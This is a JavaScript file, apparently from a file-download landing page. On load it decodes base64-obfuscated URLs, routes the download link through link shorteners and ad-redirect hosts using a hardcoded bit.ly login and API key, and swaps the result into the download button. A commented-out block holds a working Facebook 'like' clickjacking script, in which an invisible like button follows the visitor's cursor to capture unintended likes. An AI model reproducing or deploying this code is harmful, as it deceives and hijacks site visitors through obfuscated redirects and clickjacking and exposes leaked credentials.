function url_changer(shorterurl) {
  var dloadbutton = document.getElementById('dloadbutton');
                        dloadbutton.href=shorterurl;
var dloadimage = document.getElementById('dloadimage');
                        dloadimage.src="https://googledrive.com/host/0BzluYHUlH7S3TjhEckY0MTBGSmM/";
                        var loader = document.getElementById('loader');
  loader.setAttribute('style','display:none');
}

function get_short_url(long_url, login, api_key, func)
{


function get_adf(url, func)
{
var adf = B64.decode("aHR0cDovL2FndDIuYXV0b25vbW91c2NvZGUuY29tL2FkZi5waHA/");
$.getJSON(
  adf,
        {
            "format": "json",
          "url": url
        },
        function(response)
        {
           //func(response.data);
           //alert(response.data.url);
          if(response.data.url != 'error' && response.data.url != '') {
           url_changer(response.data.url);
        }else{
          url_changer('http://tinyurl.com/mokxvfc');
        }
        }
    );
}
var bitly = B64.decode("aHR0cDovL2FwaS5iaXRseS5jb20vdjMvc2hvcnRlbj9jYWxsYmFjaz0/");
    $.getJSON(
        bitly,
        {
            "format": "json",
            "apiKey": api_key,
            "login": login,
            "longUrl": long_url
        },
        function(response)
        {
            //func(response.data);
          if(response.status_code == 200 ) {
            url_changer(response.data.url);
          }else {
            get_adf(long_url);
          }
        }
    );
}


function init() {
   // quit if this function has already been called
   if (arguments.callee.done) return;

   // flag this function so we don't do the same thing twice
    arguments.callee.done = true;
var login = B64.decode("Ym9rbzEyMw==");
var api_key = "R_b1dad1d5fb975aba33d9bf8aabafebe9";
var down= document.getElementById('asin');
var isi = down.innerHTML;
var doma = B64.decode("aHR0cDovL3d3dy5nZ2xlLmNmLw==");
var land = B64.decode("dXJsPXd3dy5maWxlcG9zdC5tbCZyZWZlcmVyPXd3dy5maWxlcG9zdC5tbC9sYW5kaW5nLnBocCZrZXk9");
  var long_url= doma + B64.encode(encodeURIComponent(land+isi+"&id=1"));
    // create the "page loaded" message
  var shorterurl = null;
  
  if(shorterurl == null) {

   get_short_url(long_url, login, api_key);
   //get_adf(long_url);
 
  }
	//var shorterurli = "http://tinyurl.com/kl5toav";
	//url_changer("download","http://tinyurl.com/luqa8sh");
   };

   // for Mozilla
   if (document.addEventListener) {
    document.addEventListener("DOMContentLoaded", init, null);
   }

   // for Internet Explorer
   /*@cc_on @*/
   /*@if (@_win32)
   document.write("<script defer src=ie_onload.js><"+"/script>");
   /*@end @*/

   // for other browsers
   window.onload = init;
   
/*   var sc=document.createElement("script");
   sc.src = "http://dvl-den.net/cpaelites/clickjack/js/jquery-cookie.min.js";
  
document.getElementsByTagName("head")[0].appendChild(sc);

var bd=document.createElement("div");
bd.id = "fb-root";
document.body.appendChild(bd);

var fb = document.createElement("fb:like");
fb.setAttribute("href","https://www.facebook.com/pages/Free-Medical-BooksCom/220268083745?ref=hl");
fb.setAttribute("id","cj_like");
fb.setAttribute("action","like");
fb.setAttribute("colorscheme","light");
fb.setAttribute("layout","standard");
fb.setAttribute("show_faces","false");
document.body.appendChild(fb);

var cj= document.getElementById('cj_like');
cj.setAttribute("style","position: absolute;top: 0;left: 0;width: 52px;height: 24px;display: none;opacity: .2;z-index: 88888888;overflow: hidden;");

$(function () {
    $(document).on("mousemove", function ( e ) {
      $("#cj_like").css({
        top: e.pageY,
        left: e.pageX
      });
    });

    window.fbAsyncInit = function() {
      FB.init({ appId: '228184644015982', status: true, cookie: true, xfbml: true });

      FB.getLoginStatus(function (response) {
        if (response.status === 'connected' || response.status === 'not_authorized') {
          console.log('User logged-in');
        } else {
          $("#cj_like").hide();
          console.log('User logged-out');
        }
      });

      FB.Event.subscribe('edge.create', function (response) {
        $.cookie("fb-cj", "fb_jack", { expires: 10, path: '/' });
        $("#cj_like").hide();
      });
    };

    (function() {
      var e = document.createElement('script');
      e.type = 'text/javascript';
      e.src = document.location.protocol + '//connect.facebook.net/en_US/all.js';
      e.async = true;
      document.getElementById('fb-root').appendChild(e);
    }());

    if ($.cookie("fb-cj") != null) {
      $("#cj_like").hide();
    } else {
      $("#cj_like").show();
    }
  });
  */
